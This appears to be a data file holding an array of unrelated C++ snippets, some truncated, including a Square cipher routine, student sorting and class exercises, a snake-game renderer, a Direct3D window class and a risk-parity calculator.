roundkeys4(i+1));\n\t}\n\tsquareRound (text, temp, Te[0], Te[1], Te[2], Te[3], roundkeys4(ROUNDS-1));\n\n\t/* last round (diffusion becomes only transposition) */\n\tsquareFinal (text, temp, Se, roundkeys4(ROUNDS));\n\n\tBlock::Put(xorBlock, outBlock)(text[0])(text[1])(text[2])(text[3]);\n}\n\nvoid Square::Dec::ProcessAndXorBlock(const byte *inBlock, const byte *xorBlock, byte *outBlock) const\n{\n\tword32 text[4], temp[4];\n\tBlock::Get(inBlock)(text[0])(text[1])(text[2])(text[3]);\n   \n\t/* initial key addition */\n\ttext[0] ^= roundkeys(0, 0);\n\ttext[1] ^= roundkeys(0, 1);\n\ttext[2] ^= roundkeys(0, 2);\n\ttext[3] ^= roundkeys(0, 3);\n \n\t/* ROUNDS - 1 full rounds */\n\tfor (int i=1; i+1<ROUNDS; i+=2)\n\t{\n\t\tsquareRound (text, temp, Td[0], Td[1], Td[2], Td[3], roundkeys4(i));\n\t\tsquareRound (temp, text, Td[0], Td[1], Td[2], Td[3], roundkeys4(i+1));\n\t}\n\tsquareRound ",
    "/*\n#include <iostream>\n#include <vector>\n\nusing namespace std;\n\nint main() {\n    const vector<int> v = {6, 18, 2093};\n    for (int i = 0; i < v.size(); ++i) {\n        cout << v[i] << endl;\n    }\n}\n*/\n\n/*\n#include <iostream>\n#include <vector>\n\nusing namespace std;\n\nint main() {\n    const vector<int> v = {6, 18, 2093};\n    for (int i = 0; i < v.size(); ++i) {\n        cout << v[i] << endl;\n    }\n}\n*/\n\n/*\n#include <iostream>\n#include <map>\n\nusing namespace std;\n\nint main() {\n    const map<string, int> cities_birth = {\n        {\"Moscow\"s, 1147},\n        {\"Saint Petersburg\"s, 1703},\n        {\"Petropavlovsk-Kamchatshiy\"s, 1740},\n    };\n    for (const auto& [name, birth] : cities_birth) {\n        cout << name << \" is \"s << 2020 - birth << \" years old\"s << endl;\n    }\n}\n*/\n\n/*\n#include <iostream>\n#include <string>\n#include <vector>\n    \nusing namespace std;\n\nvector<string> SplitIntoWords(const string& text) {\n    vector<string> words;\n    for (size_t i = 0; i < text.size(); ++i) {\n        if (text[i] == ' ') {\n            continue;\n        }\n        const size_t space_pos = text.find(' ', i);\n        if (space_pos == text.npos) {\n            words.push_back(text.substr(i));\n            break;\n        } else {\n            words.push_back(text.substr(i, space_pos - i));\n            i = space_pos;\n        }\n    }\n    return words;\n}\n\nint main() {\n    const string query = \"hello kitty\"s;\n    for (const auto& word : SplitIntoWords(query)) {\n        cout << '[' << word << ']' << endl;\n    }\n}\n*/\n\n/*\nusing namespace std;\n\nclass Rational {\npublic:\n    Rational() {\n        numerator_ = 0;\n        denominator_ = 1;\n    }\n\n    int Numerator() const {\n        return numerator_;\n    }\n\n    int Denominator() const {\n        return denominator_;\n    }\n    \n    void SetNumerator(int numerator) {\n        numerator_ = numerator;\n    }\n\n    void SetDenominator(int denominator) {\n        if (denominator != 0) {\n            denominator_ = denominator;\n        }\n    }\n\nprivate:\n    int numerator_;\n    int denominator_;\n};\n*/\n\n\n#include <string>\n\nusing namespace std;\n\nenum class AnimalType {\n    Cat,\n    Dog,\n    Mouse,\n};\n\nclass Animal {\npublic:\n    Animal() = default;\n\n    Animal(AnimalType type, const string& name, const string& owner_name) {\n        type_ = type;\n        name_ = name;\n        owner_name_ = owner_name;\n    }\n\n    AnimalType GetType() const {\n        return type_;\n    }\n\n    const string& GetName() const {\n        return name_;\n    }\n\n    const string& GetOwnerName() const {\n        return owner_name_;\n    }\n\nprivate:\n    AnimalType type_ = AnimalType::Cat;\n    string name_ = \"Boris\"s;\n    string owner_name_ = \"Ivan\"s;\n};",
    "/* Nama        : Nico Ardy Hermawan */\n/* NIM         : 230401010076 */\n/* Kelas       : IT201 */\n/* Mata Kuliah : Struktur Data dan Algoritma */\n\n#include <iostream>\n#include <string>\nusing namespace std;\n\nstruct Profile {\n    string name, address;\n};\n\n// Fungsi Bubble Sort\nvoid bubbleSort(Profile arr[], int limit){\n    for (int i = 0; i < limit - 1; i++) {\n        for (int j = 0; j < limit - i - 1; j++) {\n            if (arr[j].name.compare(arr[j + 1].name) > 0) {\n                Profile temp = arr[j];\n                arr[j] = arr[j + 1];\n                arr[j + 1] = temp;\n            }\n        }\n    }\n}\n\n// Fungsi Selection Sort\nvoid selectionSort(Profile arr[], int limit){\n    for (int i = 0; i < limit - 1; i++) {\n        int minIndex = i;\n        for (int j = i + 1; j < limit; j++) {\n            if (arr[j].name.compare(arr[minIndex].name) < 0) {\n                minIndex = j;\n            }\n            \n        }\n        if (minIndex != i) {\n            Profile temp = arr[i];\n            arr[i] = arr[minIndex];\n            arr[minIndex] = temp;\n        }\n    }\n}\n\n// Fungsi unutk mencetak Array\nvoid printArray(Profile arr[], int size){\n    for (int i = 0; i < size; i++) {\n        cout << \"Name: \" << arr[i].name << \", Address: \" << arr[i].address << endl;\n    }\n    cout << endl;\n}\n\nint main(){\n    Profile arr[] = {\n        {\"Fahmi\", \"Jakarta\"},\n        {\"Romi\", \"Solo\"},\n        {\"Andri\", \"Jakarta\"},\n        {\"Fadillah\", \"Banyuwangi\"},\n        {\"Ruli\", \"Bandung\"},\n        {\"Rudi\", \"Bali\"},\n        {\"Dendi\", \"Purwokerto\"},\n        {\"Zaki\", \"Madiun\"}\n    };\n    int n = sizeof(arr) / sizeof(arr[0]);\n\n    cout << \"Before Sort: \" << endl;\n    printArray(arr, n);\n\n    cout << \"Bubble Sort: \" << endl;\n    bubbleSort(arr, n);\n    printArray(arr, n);\n\n    cout << \"After Selection Sort: \" << endl;\n    selectionSort(arr, n);\n    printArray(arr, n);\n\n    return 0;\n}",
    "#include <cstdint>\n#include \"rendering.hpp\"\n#include \"font.hpp\"\n#include \"sprites.hpp\"\n\nconstexpr uint8_t rainbow_pack_sprite_layers = 3;\nconst static uint64_t rainbow_pack_sprites[rainbow_pack_sprite_layers] = { SPRITE_VALUE_PACK, SPRITE_VALUE_PACK_INNER_1, SPRITE_VALUE_PACK_INNER_2 };\nconst static uint32_t rainbow_pack_colors[rainbow_pack_sprite_layers] = { RAINBOW_PACK_COLOR_1, RAINBOW_PACK_COLOR_2, RAINBOW_PACK_COLOR_3 };\n\nconstexpr uint8_t snake_segment_sprite_layers = 2;\nconst static uint64_t snake_body_sprites[snake_segment_sprite_layers] = { SPRITE_SNAKE_BODY, SPRITE_SNAKE_BODY_SCALE };\nconst static uint64_t snake_corner_sprites[snake_segment_sprite_layers] = { SPRITE_SNAKE_CORNER, SPRITE_SNAKE_CORNER_SCALE };\n\nconst bit_extractor_t orientation_normal = [](uint8_t x, uint8_t y, uint64_t sprite) -> uint8_t {\n    return (sprite >> ((7 - y) * 8 + (7 - x))) & 1;\n};\n\nconst bit_extractor_t orientation_flipped = [](uint8_t x, uint8_t y, uint64_t sprite) -> uint8_t {\n    return (sprite >> (y * 8 + x)) & 1;\n};\n\nconst bit_extractor_t orientation_rotated_90 = [](uint8_t x, uint8_t y, uint64_t sprite) -> uint8_t {\n    return (sprite >> ((7 - x) * 8 + y)) & 1;\n};\n\nconst bit_extractor_t orientation_rotated_270 = [](uint8_t x, uint8_t y, uint64_t sprite) -> uint8_t {\n    return (sprite >> (x * 8 + (7 - y))) & 1;\n};\n\nbit_extractor_t orientation_from_dir(Direction dir) {\n    bit_extractor_t orientation;\n\n    switch (dir) {\n        case Direction::Up:\n            orientation = orientation_normal;\n            break;\n        case Direction::Down:\n            orientation = orientation_flipped;\n            break;\n        case Direction::Left:\n            orientation = orientation_rotated_90;\n            break;\n        case Direction::Right:\n            orientation = orientation_rotated_270;\n            break;\n    }\n\n    return orientation;\n}\n\nuint32_t calc_bg_color(uint8_t x, uint8_t y) {\n    return (x + y) % 2 == 0\n        ? BACKGROUND_COLOR_1\n        : BACKGROUND_COLOR_2;\n}\n\nuint32_t calc_gradient_color(uint8_t x, uint8_t y, uint8_t width, uint8_t height) {\n    const float hue_x = static_cast<float>(x) / static_cast<float>(width);\n    const float hue_y = static_cast<float>(y) / static_cast<float>(height);\n    const float hue = (hue_x + hue_y) / 2;\n\n    return hsv_to_rgb(hue, 1, 1);\n}\n\nuint32_t hsv_to_rgb(float h, float s, float v) {\n    int i = static_cast<int>(h * 6);\n\n    float r, g, b;\n    float f = (h * 6) - i;\n    float p = v * (1 - s);\n    float q = v * (1 - (f * s));\n    float t = v * (1 - ((1 - f) * s));\n\n    i = i % 6;\n\n    switch (i) {\n        case 0: r = v; g = t; b = p; break;\n        case 1: r = q; g = v; b = p; break;\n        case 2: r = p; g = v; b = t; break;\n        case 3: r = p; g = q; b = v; break;\n        case 4: r = t; g = p; b = v; break;\n        case 5: r = v; g = p; b = q; break;\n        default: r = g = b = 0; break;\n    }\n\n    return  (static_cast<uint32_t>(r * 255) << 16) |\n            (static_cast<uint32_t>(g * 255) << 8)  |\n            (static_cast<uint32_t>(b * 255));\n}\n\nvoid draw_rect(FrameBufferImpl &fb, int x, int y, int width, int height, uint32_t color) {\n    for (int i = 0; i < height; i++) {\n        for (int j = 0; j < width; j++) {\n            fb.write_pixel(x + j, y + i, color);\n        }\n    }\n}\n\nvoid draw_sprite(FrameBufferImpl &fb, int pixel_x, int pixel_y, int scale, uint32_t color, uint32_t bg_color, uint64_t sprite, bit_extractor_t orientation, bool is_transparent) {\n    for (uint8_t y = 0; y < 8; y++) {\n        for (uint8_t x = 0; x < 8; x++) {\n            const uint8_t bit = orientation(x, y, sprite);\n\n            if (is_transparent && !bit) {\n                continue;\n            }\n\n            draw_rect(fb, pixel_x + (x * scale), pixel_y + (y * scale), scale, scale, bit ? color : bg_color);\n        }\n    }\n}\n\nvoid draw_tile(FrameBufferImpl &fb, int tile_x, int tile_y, Tile tile) {\n    const int pixel_pos_x = tile_x * TILE_PIXELS;\n    const int pixel_pos_y = tile_y * TILE_PIXELS;\n\n    const uint32_t bg_color = calc_bg_color(tile_x, tile_y);\n\n    switch (tile) {\n        case Tile::Food:\n            draw_sprite(fb, pixel_pos_x, pixel_pos_y, TILE_SPRITE_SCALE, GROW_PACK_COLOR, bg_color, SPRITE_VALUE_PACK, orientation_normal);\n            break;\n        case Tile::PortalPack:\n            draw_sprite(fb, pixel_pos_x, pixel_pos_y, TILE_SPRITE_SCALE, PORTAL_PACK_COLOR, bg_color, SPRITE_VALUE_PACK, orientation_normal);\n            break;\n        case Tile::AttackPack:\n            draw_sprite(fb, pixel_pos_x, pixel_pos_y, TILE_SPRITE_SCALE, ATTACK_PACK_COLOR, bg_color, SPRITE_VALUE_PACK, orientation_normal);\n            break;\n        case Tile::RainbowPack:\n            draw_layered_sprites<rainbow_pack_sprite_layers>(fb, pixel_pos_x, pixel_pos_y, TILE_SPRITE_SCALE, bg_color, orientation_normal, rainbow_pack_sprites, rainbow_pack_colors);\n            break;\n        case Tile::HeartPack:\n            draw_sprite(fb, pixel_pos_x, pixel_pos_y, TILE_SPRITE_SCALE, HEART_ICON_COLOR, bg_",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"signup\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "class Solution {\npublic:\n           \n    vector<int> getLeftMaxArray(vector<int>&height,int& n){\n        vector<int>leftMax(n);   //n number ki left array\n\n        leftMax[0]=height[0];  //sbse left element\n        for(int i=1; i<n; i++){\n            leftMax[i]=max(leftMax[i-1],height[i]);\n          //jo ab tk dekha ya toh voh ya meri height jaha mai khdi hu\n        }\n        return leftMax;\n    }\n\n    vector<int>getRightMaxArray(vector<int>&height,int& n){\n        vector<int>rightMax(n);\n        rightMax[n-1]=height[n-1];  //sbse right element\n        for(int i=n-2; i>=0; i--){\n            rightMax[i]=max(rightMax[i+1],height[i]);\n        }\n        return rightMax;\n    \n    }\n\n    int trap(vector<int>& height) {\n        int n =height.size(); //number of elements\n\n\n        vector<int> leftMax=getLeftMaxArray(height,n); //function jo call krenge array\n        vector<int> rightMax=getRightMaxArray(height,n);//ko upper\n\n        int sum=0;\n\n        for(int i=0;i<n;i++){ //(4,5)=4-2=2\n            int h=min(leftMax[i],rightMax[i])-height[i];\n\n            sum+=h;  //water storage total\n        }\n        return sum;\n    }\n    \n};",
    "#include <bits/stdc++.h>\n#include <iostream>\nusing namespace std;\n\nvoid lastOccurrenceLTR(string &s, char x, int i, int &ans) {\n  // Base Case\n  if (i >= s.size()) {\n    return;\n  }\n  // One Case Solved\n  if (s[i] == x) {\n    ans = i;\n  }\n  // Recursive Call\n  lastOccurrenceLTR(s, x, i + 1, ans);\n}\n\nvoid lastOccurrenceRTL(string &s, char x, int i, int &ans) {\n  // Base Case\n  if (i < 0) {\n    return;\n  }\n  // One Case Solved\n  if (s[i] == x) {\n    ans = i;\n    return;\n  }\n  // Recursive Call\n  lastOccurrenceRTL(s, x, i - 1, ans);\n}\n\nint main() {\n  // Last Occurrence Of Char In String\n  // Method 1 : Search Left to Right\n  // Method 2 : Search Right to Left\n  // Use Function strrchr()\n  // TC -> O(n)\n  // SC -> O(n)\n  // M1 :\n  string s;\n  cin >> s;\n  int ans = -1;\n  char x;\n  cin >> x;\n  int i = 0;\n  lastOccurrenceLTR(s, x, i, ans);\n  cout << \"Last Occurrence of \" << x << \" is at index \" << ans << endl;\n  lastOccurrenceRTL(s, x, i, ans);\n  cout << \"Last Occurrence of Using RTL \" << x << \" is at index \" << ans\n       << endl;\n}",
    "#include<iostream>\nusing namespace std;\n\nint main(){\n    cout<<\"===========================================================================================================================\"<<endl;\n    cout<<\"===================================================== Simple Calculator ===================================================\"<<endl;\n    cout<<\"===========================================================================================================================\"<<endl;\n\n    char ch;cout<<\"press c for calculate or any other keys to quit : \";\n    cin>>ch;\n    while (ch=='c')\n    {\n        int first_number,second_number;\n        cout<<\"enter first number : \";cin>>first_number;\n        cout<<endl;\n        cout<<\"enter second number : \";cin>>second_number;\n        cout<<endl;\n\n        string operation;cout<<\"enter operator : \";\n        cin>>operation;\n\n        if (operation==\"+\")\n        {\n            cout<<first_number+second_number<<endl;\n        }\n        else if (operation==\"-\")\n        {\n            cout<<first_number-second_number<<endl;\n        }\n        else if (operation==\"*\")\n        {\n            cout<<first_number*second_number<<endl;\n        }\n        else if (operation==\"/\")\n        {\n            cout<<float(first_number)/float(second_number)<<endl;\n        }\n        \n        cout<<\"press c for calculate again or any other keys to quit : \";\n        cin>>ch;\n        cout<<\"=========================================================================================================================\"<<endl;\n    }\n    \n    \n    \n}",
    "#include <iostream>\n#include <nlohmann/json.hpp>\n\nusing json = nlohmann::json;\n\nint main()\n{\n    // create JSON values\n    json j_null;\n    json j_boolean = true;\n    json j_number_integer = 17;\n    json j_number_unsigned_integer = 12345678987654321u;\n    json j_number_float = 23.42;\n    json j_object = {{\"one\", 1}, {\"two\", 2}};\n    json j_array = {1, 2, 4, 8, 16};\n    json j_string = \"Hello, world\";\n    json j_binary = json::binary({1, 2, 3});\n\n    // call is_number_unsigned()\n    std::cout << std::boolalpha;\n    std::cout << j_null.is_number_unsigned() << '\\n';\n    std::cout << j_boolean.is_number_unsigned() << '\\n';\n    std::cout << j_number_integer.is_number_unsigned() << '\\n';\n    std::cout << j_number_unsigned_integer.is_number_unsigned() << '\\n';\n    std::cout << j_number_float.is_number_unsigned() << '\\n';\n    std::cout << j_object.is_number_unsigned() << '\\n';\n    std::cout << j_array.is_number_unsigned() << '\\n';\n    std::cout << j_string.is_number_unsigned() << '\\n';\n    std::cout << j_binary.is_number_unsigned() << '\\n';\n}\n",
    "#include <iostream>\n#include <vector>\n#include <cmath>\n#include <numeric>\n\n// Function to calculate the mean of a vector\ndouble mean(const std::vector<double>& data) {\n    double sum = std::accumulate(data.begin(), data.end(), 0.0);\n    return sum / data.size();\n}\n\n// Function to calculate the standard deviation of a vector\ndouble standardDeviation(const std::vector<double>& data) {\n    double avg = mean(data);\n    double sq_sum = std::inner_product(data.begin(), data.end(), data.begin(), 0.0);\n    return std::sqrt(sq_sum / data.size() - avg * avg);\n}\n\n// Function to normalize the weights so that they sum to 1\nstd::vector<double> normalizeWeights(const std::vector<double>& weights) {\n    double sum = std::accumulate(weights.begin(), weights.end(), 0.0);\n    std::vector<double> normalizedWeights;\n    for (double weight : weights) {\n        normalizedWeights.push_back(weight / sum);\n    }\n    return normalizedWeights;\n}\n\n// Function to calculate risk parity weights\nstd::vector<double> calculateRiskParityWeights(const std::vector<std::vector<double>>& returns) {\n    size_t n = returns.size();\n    std::vector<double> volatilities(n);\n    std::vector<double> weights(n);\n\n    // Calculate the volatility for each asset\n    for (size_t i = 0; i < n; ++i) {\n        volatilities[i] = standardDeviation(returns[i]);\n    }\n\n    // Calculate the initial weights as inverse of volatilities\n    for (size_t i = 0; i < n; ++i) {\n        weights[i] = 1.0 / volatilities[i];\n    }\n\n    // Normalize the weights to sum to 1\n    return normalizeWeights(weights);\n}\n\nint main() {\n    // Example historical returns data for 3 assets with different time periods\n    std::vector<std::vector<double>> returns = {\n        {0.01, 0.02, -0.01, 0.03, 0.02},       // Asset 1\n        {0.02, 0.01, 0.03, 0.01, 0.04, 0.02},  // Asset 2\n        {-0.01, 0.01, 0.02, 0.00, 0.01, -0.02, 0.03} // Asset 3\n    };\n\n    // Calculate risk parity weights\n    std::vector<double> weights = calculateRiskParityWeights(returns);\n\n    // Output the weights\n    std::cout << \"Risk Parity Weights:\" << std::endl;\n    for (size_t i = 0; i < weights.size(); ++i) {\n        std::cout << \"Asset \" << i + 1 << \": \" << weights[i] << std::endl;\n    }\n\n    return 0;\n}\n",
    "#include \"hander.h\"\nnamespace FCT {\n\tWindow* Win32_D3D11_CreateWindow()\n\t{\n\t\treturn FCT_NEW( Win32_D3D11_Window);\n\t}\n\n\tvoid Win32_D3D11_Window::Init()\n\t{\n\t\tWNDCLASSEXW wcex = {};\n\n\t\twcex.cbSize = sizeof(WNDCLASSEX);\n\n\t\twcex.style = CS_HREDRAW | CS_VREDRAW;\n\t\twcex.lpfnWndProc = WndProc;\n\t\twcex.cbClsExtra = 0;\n\t\twcex.cbWndExtra = 0;\n\t\twcex.hInstance = NULL;\n\t\twcex.hIcon = NULL;\n\t\twcex.hCursor = LoadCursor(NULL, IDC_ARROW);\n\t\twcex.hbrBackground = NULL;\n\t\twcex.lpszMenuName = NULL;\n\t\twcex.lpszClassName = L\"DeaultWindowClass\";\n\t\twcex.hIconSm = NULL;\n\n\t\tRegisterClassExW(&wcex);\n\t}\n\n\tvoid Win32_D3D11_Window::WndThread(Win32_D3D11_Window* wnd)\n\t{\n\t\twnd->addRef();\n\t\tRECT rc;\n\t\tSetRect(&rc, 0, 0, wnd->m_width, wnd->m_height);\n\t\tAdjustWindowRect(&rc, WS_POPUP | ((wnd->m_style & ws_debug) ? WS_CAPTION | WS_SYSMENU : 0), FALSE);\n\t\tif (wnd->m_width == CW_USEDEFAULT) {\n\t\t\trc.left = 0;\n\t\t\trc.right = CW_USEDEFAULT;\n\t\t}\n\t\tif (wnd->m_height == CW_USEDEFAULT) {\n\t\t\trc.top = 0;\n\t\t\trc.bottom = CW_USEDEFAULT;\n\t\t}\n\t\t//\n\t\twnd->m_input = FCT_NEW(Win32_Input,wnd);\n\t\t//\u00b4\u00b4\u00bd\u00a8\u00ce\u00de\u00b1\u00df\u00bf\u00f2\u00b4\u00b0\u00bf\u00da\n\t\t//\u00b4\u00b4\u00bd\u00a8\u00b4\u00b0\u00bf\u00da\n\t\twnd->m_wnd = CreateWindowExW(0\n\t\t\t, L\"DeaultWindowClass\"\n\t\t\t, wnd->m_name,\n\t\t\tWS_POPUP | ((wnd->m_style & ws_debug) ? WS_CAPTION | WS_SYSMENU : 0)\n\t\t\t, wnd->m_x, wnd->m_y, rc.right - rc.left, rc.bottom - rc.top,\n\t\t\tNULL, NULL, NULL,\n\t\t\t(LPVOID)wnd);\n\t\tdo {\n\t\t\tif (!wnd->m_wnd) {\n\t\t\t\twnd->m_input->release();\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\twnd->m_created = true;\n\t\t\tMSG msg;\n\t\t\twhile (GetMessage(&msg, NULL, 0, 0)) {\n\t\t\t\tTranslateMessage(&msg);\n\t\t\t\tDispatchMessage(&msg);\n\t\t\t}\n#ifdef Test\n#endif // Test\n\n\n\t\t} while (0);\n\t\twnd->m_runing = false;\n\t\twnd->m_created = false;\n\t\twnd->release();\n\t}\n\n\twindow_info_t Win32_D3D11_Window::create(uint32_t style)\n\t{\n\n\t\tm_style = style;\n\t\tif (m_created) {\n\t\t\treturn window_error_has_created;\n\t\t}\n\t\tm_runing = true;\n\t\tm_thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WndThread, this, 0, NULL);\n\t\twhile (!m_created && m_runing) {\n\t\t\tSleep(1);\n\t\t}\n\t\tif (!m_runing) {\n\t\t\treturn window_error;\n\t\t}\n\t\treturn window_success;\n\t}\n\n\tWin32_D3D11_Window::Win32_D3D11_Window()\n\t{\n\t\tREF_CLASS_BEGIN();\n\t\tm_buffer = NULL;\n\t\tm_input = NULL;\n\t\tm_wnd = NULL;\n\t\tm_thread = NULL;\n\t\tm_name = L\"Unnamed\";\n\t\tm_width = CW_USEDEFAULT;\n\t\tm_height = CW_USEDEFAULT;\n\t\tm_x = CW_USEDEFAULT;\n\t\tm_y = CW_USEDEFAULT;\n\t\tm_nMaxWidth = 0;\n\t\tm_nMaxHeight = 0;\n\t\tm_nMinWidth = 0;\n\t\tm_nMinHeight = 0;\n\t\tm_style = 0;\n\t\tm_created = false;\n\t\tm_runing = false;\n\t\tm_samplerState = NULL;\n\t\tm_device = NULL;\n\t\tm_context = NULL;\n\t\tm_bufferTexture = NULL;\n\t\tm_bufferTextureView = NULL;\n\t\tm_swapChain = NULL;\n\t\tm_renderTargetView = NULL;\n\t\tm_depthStencilBuffer = NULL;\n\t\tm_depthStencilView = NULL;\n\t\tm_inputLayout = NULL;\n\t\tm_featureLevel = {};\n\t\tm_vertexShader = NULL;\n\t\tm_pixelShader = NULL;\n\t\tm_vertexBuffer = NULL;\n\t}\n\n\tWin32_D3D11_Window::~Win32_D3D11_Window()\n\t{\n\t\tdestroy();\n\t}\n\n\tvoid Win32_D3D11_Window::destroy()\n\t{\n\t\tif (m_runing) {\n\t\t\tDestroyWindow(m_wnd);\n\t\t\tCloseHandle(m_thread);\n\t\t\tm_runing = false;\n\t\t\tm_wnd = NULL;\n\t\t\tm_thread = NULL;\n\t\t}\n\n\t\tif (m_buffer) {\n\t\t\tdelete[] m_buffer;\n\t\t\tm_buffer = NULL;\n\t\t}\n\t\tFCT_RELEASE(m_input);\n\t\tCOM_RELEASE(m_samplerState);\n\t\tCOM_RELEASE(m_device);\n\t\tCOM_RELEASE(m_context);\n\t\tCOM_RELEASE(m_bufferTexture);\n\t\tCOM_RELEASE(m_bufferTextureView);\n\t\tCOM_RELEASE(m_swapChain);\n\t\tCOM_RELEASE(m_renderTargetView);\n\t\tCOM_RELEASE(m_depthStencilBuffer);\n\t\tCOM_RELEASE(m_depthStencilView);\n\t\tCOM_RELEASE(m_inputLayout);\n\t\tCOM_RELEASE(m_vertexShader);\n\t\tCOM_RELEASE(m_pixelShader);\n\t\tCOM_RELEASE(m_vertexBuffer);\n\t}\n\tvoid Win32_D3D11_Window::size(int w, int h)\n\t{\n\t\tif (m_created) {\n\t\t\tif (m_height == h && m_width == w)\n\t\t\t\treturn;\n\t\t\tSetWindowPos(m_wnd, NULL, 0, 0, w, h, SWP_NOMOVE | SWP_NOZORDER);\n\t\t\treturn;\n\t\t}\n\t\tm_width = w;\n\t\tm_height = h;\n\t\treturn;\n\t}\n\n\tvoid Win32_D3D11_Window::show()\n\t{\n\t\tShowWindow(m_wnd, SW_SHOW);\n\t}\n\n\tvoid Win32_D3D11_Window::name(const wchar_t* name)\n\t{\n\t\tif (m_created) {\n\n\t\t\treturn;\n\t\t}\n\t\tm_name = name;\n\t\treturn;\n\t}\n\n\tvoid Win32_D3D11_Window::flush()\n\t{\n\t\tD3D11_MAPPED_SUBRESOURCE mappedResource;\n\n\t\tm_context->Map(m_bufferTexture, 0, D3D11_MAP_WRITE_DISCARD, 0, &mappedResource);\n\t\tmemcpy(mappedResource.pData, m_buffer, sizeof(Color) * m_width * m_height);\n\t\tm_context->Unmap(m_bufferTexture, 0);\n\t\tfloat color[4] = { 0, 0, 1.0f, 0 };\n\t\tm_context->ClearRenderTargetView(m_renderTargetView, color);\n\t\tm_context->ClearDepthStencilView(m_depthStencilView, D3D11_CLEAR_DEPTH | D3D11_CLEAR_STENCIL, 1.0f, 0);\n\t\tUINT stride = sizeof(Vertex);\n\t\tUINT offset = 0;\n\t\tm_context->IASetVertexBuffers(0, 1, &m_vertexBuffer, &stride, &offset);\n\t\tm_context->IASetPrimitiveTopology(D3D11_PRIMITIVE_TOPOLOGY_TRIANGLESTRIP);\n\t\tm_context->Draw(4, 0);\n\t\tm_swapChain->Present(0, 0);\n\t}\n\n\tbool Win32_D3D11_Window::isRunning()\n\t{\n\t\treturn m_runing;\n\t}\n\n\tColor* Win32_D3D11_Window::getBuffer()\n\t{\n\t\treturn m_buffer;\n\t}\n\n\tint Win32_D3D11_Window::getx()\n\t{\n\t\treturn m_x;\n\t}\n\n\tint Win32_D3D11_Window::gety()\n\t{\n\t\treturn m_y;\n\t}\n\n\tint Win32_D3D11_Window::getwidth()\n\t{\n\t\treturn m_wid",
    "#include <iostream>\n#include <ctime>\n#include <windows.h>\n#include <iomanip>\nusing namespace std;\n\nvoid gotoxy(int x, int y) {\n    COORD p = { x, y };\n    SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), p);\n}\n\nvoid colores(int color) {\n    HANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);\n    SetConsoleTextAttribute(h, color);\n}\n\nint tabla[20][70] = {\n    {1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0},\n    {1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0},\n    {1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0},\n    {1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0},\n    {1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0},\n    {1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0},\n    {1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0},\n    {1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0},\n    {1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0},\n    {1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0},\n    